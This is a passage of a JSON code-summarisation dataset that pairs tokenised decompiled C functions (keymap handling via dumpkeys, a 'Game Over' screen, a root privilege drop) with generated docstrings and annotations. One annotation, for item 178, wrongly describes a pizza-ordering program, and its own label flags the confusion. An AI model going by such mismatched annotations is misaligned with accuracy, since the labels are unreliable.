            ";",
            "}",
            "v12",
            "=",
            "*",
            "a2",
            ";",
            "if",
            "(",
            "(",
            "*",
            "a2",
            "&",
            "0x1A",
            ")",
            "=",
            "=",
            "26",
            ")",
            "{",
            "v24",
            "=",
            "a4",
            ">",
            ">",
            "2",
            ";",
            "v21",
            "=",
            "\"<\"",
            ";",
            "LABEL_89",
            ":",
            "v25",
            "=",
            "v23",
            ";",
            "__swprintf_chk",
            "(",
            "v23",
            ",",
            "64L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "0x3FFFFFFFFFFFFFFFL",
            "L",
            ",",
            "v21",
            ")",
            ";",
            "v22",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "18",
            ")",
            ";",
            "v10",
            "=",
            "v24",
            ";",
            "goto",
            "LABEL_90",
            ";",
            "}",
            "if",
            "(",
            "(",
            "v12",
            "&",
            "0xA",
            ")",
            "=",
            "=",
            "10",
            ")",
            "{",
            "v24",
            "=",
            "a4",
            ">",
            ">",
            "2",
            ";",
            "v21",
            "=",
            "\"<\"",
            ";",
            "goto",
            "LABEL_89",
            ";",
            "}",
            "if",
            "(",
            "(",
            "v12",
            "&",
            "0x12",
            ")",
            "=",
            "=",
            "18",
            ")",
            "{",
            "v24",
            "=",
            "a4",
            ">",
            ">",
            "2",
            ";",
            "v21",
            "=",
            "\"<\"",
            ";",
            "goto",
            "LABEL_89",
            ";",
            "}",
            "if",
            "(",
            "(",
            "v12",
            "&",
            "0x18",
            ")",
            "=",
            "=",
            "24",
            ")",
            "{",
            "v24",
            "=",
            "a4",
            ">",
            ">",
            "2",
            ";",
            "v21",
            "=",
            "\"<\"",
            ";",
            "goto",
            "LABEL_89",
            ";",
            "}",
            "if",
            "(",
            "(",
            "v12",
            "&",
            "0x10",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v24",
            "=",
            "a4",
            ">",
            ">",
            "2",
            ";",
            "v21",
            "=",
            "\"<\"",
            ";",
            "goto",
            "LABEL_89",
            ";",
            "}",
            "if",
            "(",
            "(",
            "v12",
            "&",
            "8",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v24",
            "=",
            "a4",
            ">",
            ">",
            "2",
            ";",
            "v21",
            "=",
            "\"<\"",
            ";",
            "goto",
            "LABEL_89",
            ";",
            "}",
            "if",
            "(",
            "(",
            "*",
            "a2",
            "&",
            "2",
            ")",
            "=",
            "=",
            "0",
            ")",
            "{",
            "LABEL_29",
            ":",
            "v13",
            "=",
            "v9",
            ";",
            "goto",
            "LABEL_30",
            ";",
            "}",
            "v24",
            "=",
            "a4",
            ">",
            ">",
            "2",
            ";",
            "v25",
            "=",
            "v23",
            ";",
            "__swprintf_chk",
            "(",
            "v23",
            ",",
            "64L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "0x3FFFFFFFFFFFFFFFL",
            "L",
            ",",
            "\"<\"",
            ")",
            ";",
            "v22",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "18",
            ")",
            ";",
            "v10",
            "=",
            "v24",
            ";",
            "LABEL_90",
            ":",
            "v13",
            "=",
            "v22",
            ";",
            "if",
            "(",
            "v22",
            ">",
            "0x80u",
            ")",
            "__assert_fail",
            "(",
            "\"code < sizeof(char_or_func)\"",
            ",",
            "\"keymap.c\"",
            ",",
            "0x4Cu",
            ",",
            "\"is_char_key\"",
            ")",
            ";",
            "LABEL_30",
            ":",
            "v14",
            "=",
            "char_or_func",
            "[",
            "v13",
            "]",
            ";",
            "if",
            "(",
            "v14",
            "!",
            "=",
            "99",
            ")",
            "{",
            "if",
            "(",
            "v14",
            "=",
            "=",
            "70",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "20",
            ")",
            "!",
            "=",
            "1",
            ")",
            "goto",
            "LABEL_2",
            ";",
            "}",
            "else",
            "if",
            "(",
            "v14",
            "!",
            "=",
            "102",
            ")",
            "{",
            "v15",
            "=",
            "\"%\"",
            ";",
            "goto",
            "LABEL_34",
            ";",
            "}",
            "v15",
            "=",
            "\"%\"",
            ";",
            "LABEL_34",
            ":",
            "v7",
            "=",
            "(",
            "int",
            ")",
            "__swprintf_chk",
            "(",
            "a3",
            ",",
            "v10",
            ",",
            "1L",
            "L",
            ",",
            "0x3FFFFFFFFFFFFFFFL",
            "L",
            ",",
            "v15",
            ")",
            ";",
            "goto",
            "LABEL_36",
            ";",
            "}",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "v13",
            "-",
            "2",
            ";",
            "if",
            "(",
            "(",
            "*",
            "a2",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "v16",
            ">",
            "0xB",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v13",
            "-",
            "16",
            ")",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "v13",
            "-",
            "4",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v13",
            "-",
            "30",
            ")",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "v13",
            "-",
            "6",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v13",
            "-",
            "43",
            ")",
            "<",
            "=",
            "0xA",
            ")",
            "{",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "v13",
            "-",
            "7",
            ";",
            "}",
            "else",
            "{",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "-",
            "1",
            ";",
            "if",
            "(",
            "v13",
            "=",
            "=",
            "86",
            ")",
            "LODWORD",
            "(",
            "v16",
            ")",
            "=",
            "47",
            ";",
            "}",
            "}",
            "v16",
            "=",
            "(",
            "int",
            ")",
            "v16",
            ";",
            "v17",
            "=",
            "altgr_keys",
            "[",
            "(",
            "int",
            ")",
            "v16",
            "]",
            ";",
            "if",
            "(",
            "!",
            "v17",
            ")",
            "{",
            "if",
            "(",
            "(",
            "*",
            "a2",
            "&",
            "4",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v18",
            "=",
            "shift_keys",
            "[",
            "(",
            "int",
            ")",
            "v16",
            "]",
            ";",
            "goto",
            "LABEL_50",
            ";",
            "}",
            "goto",
            "LABEL_72",
            ";",
            "}",
            "LABEL_63",
            ":",
            "if",
            "(",
            "v17",
            "!",
            "=",
            "60",
            ")",
            "{",
            "LABEL_52",
            ":",
            "v15",
            "=",
            "\"%\"",
            ";",
            "goto",
            "LABEL_34",
            ";",
            "}",
            "goto",
            "LABEL_64",
            ";",
            "}",
            "if",
            "(",
            "(",
            "*",
            "a2",
            "&",
            "4",
            ")",
            "=",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "v16",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "v20",
            "=",
            "v13",
            "-",
            "2",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v13",
            "-",
            "16",
            ")",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "v20",
            "=",
            "v13",
            "-",
            "4",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v13",
            "-",
            "30",
            ")",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "v20",
            "=",
            "v13",
            "-",
            "6",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v13",
            "-",
            "43",
            ")",
            "<",
            "=",
            "0xA",
            ")",
            "{",
            "v20",
            "=",
            "v13",
            "-",
            "7",
            ";",
            "}",
            "else",
            "{",
            "v6",
            "=",
            "v13",
            "=",
            "=",
            "86",
            ";",
            "v20",
            "=",
            "47",
            ";",
            "if",
            "(",
            "!",
            "v6",
            ")",
            "v20",
            "=",
            "-",
            "1",
            ";",
            "}",
            "v16",
            "=",
            "v20",
            ";",
            "goto",
            "LABEL_72",
            ";",
            "}",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "v16",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "v19",
            "=",
            "v13",
            "-",
            "2",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v13",
            "-",
            "16",
            ")",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "v19",
            "=",
            "v13",
            "-",
            "4",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v13",
            "-",
            "30",
            ")",
            "<",
            "=",
            "0xB",
            ")",
            "{",
            "v19",
            "=",
            "v13",
            "-",
            "6",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v13",
            "-",
            "43",
            ")",
            "<",
            "=",
            "0xA",
            ")",
            "{",
            "v19",
            "=",
            "v13",
            "-",
            "7",
            ";",
            "}",
            "else",
            "{",
            "v6",
            "=",
            "v13",
            "=",
            "=",
            "86",
            ";",
            "v19",
            "=",
            "47",
            ";",
            "if",
            "(",
            "!",
            "v6",
            ")",
            "v19",
            "=",
            "-",
            "1",
            ";",
            "}",
            "v16",
            "=",
            "v19",
            ";",
            "v17",
            "=",
            "shift_keys",
            "[",
            "v19",
            "]",
            ";",
            "if",
            "(",
            "v17",
            ")",
            "goto",
            "LABEL_63",
            ";",
            "LABEL_72",
            ":",
            "v18",
            "=",
            "char_keys",
            "[",
            "v16",
            "]",
            ";",
            "LABEL_50",
            ":",
            "if",
            "(",
            "v18",
            "!",
            "=",
            "60",
            ")",
            "{",
            "if",
            "(",
            "!",
            "v18",
            ")",
            "goto",
            "LABEL_2",
            ";",
            "goto",
            "LABEL_52",
            ";",
            "}",
            "LABEL_64",
            ":",
            "v7",
            "=",
            "(",
            "int",
            ")",
            "__swprintf_chk",
            "(",
            "a3",
            ",",
            "v10",
            ",",
            "1L",
            "L",
            ",",
            "0x3FFFFFFFFFFFFFFFL",
            "L",
            ",",
            "\"%\"",
            ")",
            ";",
            "LABEL_36",
            ":",
            "if",
            "(",
            "v7",
            ")",
            "{",
            "wcstombs",
            "(",
            "a3",
            ",",
            "(",
            "const",
            "wchar_t",
            "*",
            ")",
            "a3",
            ",",
            "a4",
            ")",
            ";",
            "return",
            "v7",
            ";",
            "}",
            "LABEL_2",
            ":",
            "*",
            "a3",
            "=",
            "0",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a quadword (64 bits) from the FS segment register on x86 architecture, providing low-level access to system-specific data structures or processor state."
        ],
        "longer_label": "The provided code appears to be a function called `translate_event` that likely translates events based on certain conditions, utilizing low-level operations such as bitwise manipulation and possibly accessing system-specific data structures, with the annotation explaining the usage of `__readfsqword` to access system-specific data structures or processor state."
    },
    {
        "id": 178,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "and",
            "processes",
            "key",
            "mappings",
            "from",
            "the",
            "system",
            "using",
            "dumpkeys",
            "and",
            "popen",
            ",",
            "storing",
            "them",
            "in",
            "different",
            "arrays",
            "based",
            "on",
            "the",
            "key",
            "type",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "FILE",
            "*",
            "v0",
            ";",
            "FILE",
            "*",
            "v1",
            ";",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "unsigned",
            "int",
            "v6",
            ";",
            "char",
            "*",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "int",
            "v9",
            ";",
            "int",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "int",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "char",
            "*",
            "i",
            ";",
            "int",
            "v15",
            ";",
            "int",
            "v16",
            ";",
            "wint_t",
            "v17",
            ";",
            "char",
            "*",
            "j",
            ";",
            "int",
            "v19",
            ";",
            "int",
            "v20",
            ";",
            "wint_t",
            "v22",
            ";",
            "char",
            "*",
            "endptr",
            ";",
            "char",
            "s",
            ";",
            "char",
            "v25",
            ";",
            "char",
            "v26",
            "[",
            "7",
            "]",
            ";",
            "char",
            "nptr",
            "[",
            "243",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v28",
            ";",
            "v28",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v0",
            "=",
            "popen",
            "(",
            "\"/usr/bin/dumpkeys -n | /bin/grep '^\\\\([[:space:]]shift[[:space:]]\\\\)*\\\\([[:space:]]altgr[[:space:]]\\\\)*keycode'\"",
            "\" | /bin/sed 's/U+/0x/g' 2>&1\"",
            ",",
            "\"r\"",
            ")",
            ";",
            "if",
            "(",
            "v0",
            ")",
            "{",
            "v1",
            "=",
            "v0",
            ";",
            "LODWORD",
            "(",
            "v2",
            ")",
            "=",
            "0",
            ";",
            "do",
            "{",
            "v3",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "char_keys",
            "+",
            "v3",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "char_keys",
            "[",
            "2",
            "]",
            "+",
            "v3",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "char_keys",
            "[",
            "4",
            "]",
            "+",
            "v3",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "char_keys",
            "[",
            "6",
            "]",
            "+",
            "v3",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "while",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "<",
            "0xC0",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "char_keys",
            "+",
            "v2",
            ")",
            "=",
            "0",
            ";",
            "LODWORD",
            "(",
            "v2",
            ")",
            "=",
            "0",
            ";",
            "do",
            "{",
            "v4",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "shift_keys",
            "+",
            "v4",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "shift_keys",
            "[",
            "2",
            "]",
            "+",
            "v4",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "shift_keys",
            "[",
            "4",
            "]",
            "+",
            "v4",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "shift_keys",
            "[",
            "6",
            "]",
            "+",
            "v4",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "while",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "<",
            "0xC0",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "shift_keys",
            "+",
            "v2",
            ")",
            "=",
            "0",
            ";",
            "LODWORD",
            "(",
            "v2",
            ")",
            "=",
            "0",
            ";",
            "do",
            "{",
            "v5",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "altgr_keys",
            "+",
            "v5",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "altgr_keys",
            "[",
            "2",
            "]",
            "+",
            "v5",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "altgr_keys",
            "[",
            "4",
            "]",
            "+",
            "v5",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "altgr_keys",
            "[",
            "6",
            "]",
            "+",
            "v5",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "while",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            "<",
            "0xC0",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "altgr_keys",
            "+",
            "v2",
            ")",
            "=",
            "0",
            ";",
            "v6",
            "=",
            "1",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "v7",
            "=",
            "fgets",
            "(",
            "&",
            "s",
            ",",
            "256",
            ",",
            "v1",
            ")",
            ";",
            "if",
            "(",
            "v6",
            ">",
            "0x80",
            "|",
            "|",
            "!",
            "v7",
            ")",
            "{",
            "pclose",
            "(",
            "v1",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "if",
            "(",
            "char_or_func",
            "[",
            "v6",
            "]",
            "=",
            "=",
            "99",
            ")",
            "break",
            ";",
            "LABEL_43",
            ":",
            "+",
            "+",
            "v6",
            ";",
            "}",
            "if",
            "(",
            "s",
            "=",
            "=",
            "107",
            ")",
            "{",
            "v11",
            "=",
            "v6",
            "-",
            "2",
            ";",
            "if",
            "(",
            "v6",
            "-",
            "2",
            ">",
            "0xB",
            ")",
            "{",
            "v11",
            "=",
            "v6",
            "-",
            "4",
            ";",
            "if",
            "(",
            "v6",
            "-",
            "16",
            ">",
            "0xB",
            ")",
            "{",
            "v11",
            "=",
            "v6",
            "-",
            "6",
            ";",
            "if",
            "(",
            "v6",
            "-",
            "30",
            ">",
            "0xB",
            ")",
            "{",
            "v11",
            "=",
            "v6",
            "-",
            "7",
            ";",
            "if",
            "(",
            "v6",
            "-",
            "43",
            ">",
            "0xA",
            ")",
            "{",
            "v11",
            "=",
            "47",
            ";",
            "if",
            "(",
            "v6",
            "!",
            "=",
            "86",
            ")",
            "v11",
            "=",
            "-",
            "1",
            ";",
            "}",
            "}",
            "}",
            "}",
            "v12",
            "=",
            "strtoul",
            "(",
            "v26",
            ",",
            "&",
            "endptr",
            ",",
            "16",
            ")",
            ";",
            "v13",
            "=",
            "v12",
            ";",
            "if",
            "(",
            "v26",
            "[",
            "0",
            "]",
            "=",
            "=",
            "43",
            "&",
            "&",
            "(",
            "v12",
            "&",
            "0xB00",
            ")",
            "!",
            "=",
            "0",
            ")",
            "v13",
            "=",
            "v12",
            "^",
            "0xB00",
            ";",
            "char_keys",
            "[",
            "v11",
            "]",
            "=",
            "v13",
            ";",
            "for",
            "(",
            "i",
            "=",
            "endptr",
            ";",
            "*",
            "i",
            "=",
            "=",
            "32",
            ";",
            "+",
            "+",
            "i",
            ")",
            ";",
            "v15",
            "=",
            "strtoul",
            "(",
            "i",
            ",",
            "&",
            "endptr",
            ",",
            "16",
            ")",
            ";",
            "v16",
            "=",
            "v15",
            ";",
            "if",
            "(",
            "*",
            "i",
            "=",
            "=",
            "43",
            "&",
            "&",
            "(",
            "v15",
            "&",
            "0xB00",
            ")",
            "!",
            "=",
            "0",
            ")",
            "v16",
            "=",
            "v15",
            "^",
            "0xB00",
            ";",
            "if",
            "(",
            "!",
            "v16",
            ")",
            "{",
            "v22",
            "=",
            "char_keys",
            "[",
            "v11",
            "]",
            ";",
            "v17",
            "=",
            "towupper",
            "(",
            "v22",
            ")",
            ";",
            "v16",
            "=",
            "0",
            ";",
            "if",
            "(",
            "v22",
            "!",
            "=",
            "v17",
            ")",
            "v16",
            "=",
            "v17",
            ";",
            "}",
            "shift_keys",
            "[",
            "v11",
            "]",
            "=",
            "v16",
            ";",
            "for",
            "(",
            "j",
            "=",
            "endptr",
            ";",
            "*",
            "j",
            "=",
            "=",
            "32",
            ";",
            "+",
            "+",
            "j",
            ")",
            ";",
            "v19",
            "=",
            "strtoul",
            "(",
            "j",
            ",",
            "&",
            "endptr",
            ",",
            "16",
            ")",
            ";",
            "v20",
            "=",
            "v19",
            ";",
            "if",
            "(",
            "*",
            "j",
            "=",
            "=",
            "43",
            "&",
            "&",
            "(",
            "v19",
            "&",
            "0xB00",
            ")",
            "!",
            "=",
            "0",
            ")",
            "v20",
            "=",
            "v19",
            "^",
            "0xB00",
            ";",
            "altgr_keys",
            "[",
            "v11",
            "]",
            "=",
            "v20",
            ";",
            "goto",
            "LABEL_43",
            ";",
            "}",
            "v8",
            "=",
            "v6",
            "-",
            "3",
            ";",
            "if",
            "(",
            "v6",
            "-",
            "3",
            ">",
            "0xB",
            ")",
            "{",
            "v8",
            "=",
            "v6",
            "-",
            "5",
            ";",
            "if",
            "(",
            "v6",
            "-",
            "17",
            ">",
            "0xB",
            ")",
            "{",
            "v8",
            "=",
            "v6",
            "-",
            "7",
            ";",
            "if",
            "(",
            "v6",
            "-",
            "31",
            ">",
            "0xB",
            ")",
            "{",
            "v8",
            "=",
            "v6",
            "-",
            "8",
            ";",
            "if",
            "(",
            "v6",
            "-",
            "44",
            ">",
            "0xA",
            ")",
            "{",
            "v8",
            "=",
            "47",
            ";",
            "if",
            "(",
            "v6",
            "!",
            "=",
            "87",
            ")",
            "v8",
            "=",
            "-",
            "1",
            ";",
            "}",
            "}",
            "}",
            "}",
            "v9",
            "=",
            "strtoul",
            "(",
            "nptr",
            ",",
            "0L",
            "L",
            ",",
            "16",
            ")",
            ";",
            "v10",
            "=",
            "v9",
            ";",
            "if",
            "(",
            "nptr",
            "[",
            "0",
            "]",
            "=",
            "=",
            "43",
            "&",
            "&",
            "(",
            "v9",
            "&",
            "0xB00",
            ")",
            "!",
            "=",
            "0",
            ")",
            "v10",
            "=",
            "v9",
            "^",
            "0xB00",
            ";",
            "if",
            "(",
            "v25",
            "=",
            "=",
            "115",
            ")",
            "{",
            "shift_keys",
            "[",
            "v8",
            "]",
            "=",
            "v10",
            ";",
            "}",
            "else",
            "if",
            "(",
            "v25",
            "=",
            "=",
            "97",
            ")",
            "{",
            "altgr_keys",
            "[",
            "v8",
            "]",
            "=",
            "v10",
            ";",
            "}",
            "}",
            "}",
            "perror",
            "(",
            "\"popen\"",
            ")",
            ";",
            "return",
            "1L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `fsqword` appears to be allocating memory dynamically to store a string input, reading user input into that memory, and then printing a prompt before reading user input again, likely for a pizza ordering system, utilizing processor-specific instructions for optimized memory access and possibly branch prediction."
        ],
        "longer_label": "The code dynamically allocates memory to store key mappings, reads input from a system command to load keymap data, and handles shift and altgr keys for a keyboard layout, but the annotation regarding `fsqword` and a pizza ordering system doesn't directly relate to the code, so it seems there might be some confusion or mixing of annotations."
    },
    {
        "id": 179,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "end_game",
            "`",
            "displays",
            "``",
            "Game",
            "Over",
            "!",
            "''",
            "on",
            "the",
            "screen",
            ",",
            "waits",
            "for",
            "user",
            "input",
            ",",
            "and",
            "stops",
            "the",
            "scheduler",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "mvprintw",
            "(",
            "13",
            ",",
            "21",
            ",",
            "\"            \"",
            ")",
            ";",
            "mvprintw",
            "(",
            "14",
            ",",
            "21",
            ",",
            "\" Game Over! \"",
            ")",
            ";",
            "mvprintw",
            "(",
            "15",
            ",",
            "21",
            ",",
            "\"            \"",
            ")",
            ";",
            "wrefresh",
            "(",
            "stdscr",
            ")",
            ";",
            "wtimeout",
            "(",
            "stdscr",
            ",",
            "-",
            "1",
            ")",
            ";",
            "wgetch",
            "(",
            "stdscr",
            ")",
            ";",
            "stop_scheduler",
            "(",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The wrefresh function is used to refresh the display of a window in a terminal-based user interface, updating any changes made to the window's content.",
            "The `wtimeout` function, declared in the provided code snippets and implemented in the `Wtimeout` function in Lua, sets the blocking delay time for input on a specified ncurses window.",
            "The `wgetch` function is likely part of a library for handling keyboard input in a terminal-based application, allowing the program to wait for and retrieve a character from the keyboard input stream, with additional functionality possibly for mouse input if enabled, facilitating user interaction with the program's interface.",
            "The function \"stop_scheduler\" is likely intended to halt or terminate the task scheduler system, ensuring proper termination by both the master and slave threads, potentially by cancelling any pending work or tasks."
        ],
        "longer_label": "The provided code defines a function called `end_game` which clears a portion of the screen, displays \"Game Over!\", waits for a keyboard input, and then stops a scheduler, likely indicating the end of a terminal-based game loop."
    },
    {
        "id": 180,
        "docstring_tokens": [
            "The",
            "code",
            "drops",
            "privileges",
            "to",
            "the",
            "``",
            "nobody",
            "''",
            "user",
            ",",
            "sets",
            "resource",
            "limits",
            ",",
            "and",
            "ensures",
            "the",
            "program",
            "is",
            "not",
            "running",
            "as",
            "root",
            "before",
            "exiting",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "struct",
            "passwd",
            "*",
            "v0",
            ";",
            "struct",
            "rlimit",
            "v2",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "geteuid",
            "(",
            ")",
            ")",
            "{",
            "v0",
            "=",
            "getpwnam",
            "(",
            "\"nobody\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v0",
            ")",
            "{",
            "perror",
            "(",
            "\"getpwnam\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "chroot",
            "(",
            "\"/var/empty\"",
            ")",
            ")",
            "{",
            "perror",
            "(",
            "\"chroot\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "chdir",
            "(",
            "\"/\"",
            ")",
            ")",
            "{",
            "perror",
            "(",
            "\"chdir\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "setresgid",
            "(",
            "v0",
            "-",
            ">",
            "pw_gid",
            ",",
            "v0",
            "-",
            ">",
            "pw_gid",
            ",",
            "v0",
            "-",
            ">",
            "pw_gid",
            ")",
            ")",
            "{",
            "perror",
            "(",
            "\"setresgid\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "setgroups",
            "(",
            "1uL",
            "L",
            ",",
            "&",
            "v0",
            "-",
            ">",
            "pw_gid",
            ")",
            ")",
            "{",
            "perror",
            "(",
            "\"setgroups\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "setresuid",
            "(",
            "v0",
            "-",
            ">",
            "pw_uid",
            ",",
            "v0",
            "-",
            ">",
            "pw_uid",
            ",",
            "v0",
            "-",
            ">",
            "pw_uid",
            ")",
            ")",
            "{",
            "perror",
            "(",
            "\"setresuid\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "}",
            "v2",
            ".",
            "rlim_max",
            "=",
            "0x2000L",
            "L",
            ";",
            "v2",
            ".",
            "rlim_cur",
            "=",
            "0x2000L",
            "L",
            ";",
            "setrlimit",
            "(",
            "RLIMIT_DATA",
            ",",
            "&",
            "v2",
            ")",
            ";",
            "setrlimit",
            "(",
            "__RLIMIT_MEMLOCK",
            ",",
            "&",
            "v2",
            ")",
            ";",
            "setrlimit",
            "(",
            "RLIMIT_AS",
            ",",
            "&",
            "v2",
            ")",
            ";",
            "setrlimit",
            "(",
            "RLIMIT_STACK",
            ",",
            "&",
            "v2",
            ")",
            ";",
            "v2",
            ".",
            "rlim_max",
            "=",
            "0L",
            "L",
            ";",
            "v2",
            ".",
            "rlim_cur",
            "=",
            "0L",
            "L",
            ";",
            "setrlimit",
            "(",
            "RLIMIT_CORE",
            ",",
            "&",
            "v2",
            ")",
            ";",
            "setrlimit",
            "(",
            "__RLIMIT_NPROC",
            ",",
            "&",
            "v2",
            ")",
            ";",
            "if",
            "(",
            "!",
            "geteuid",
            "(",
            ")",
            "|",
            "|",
            "!",
            "getegid",
            "(",
            ")",
            ")",
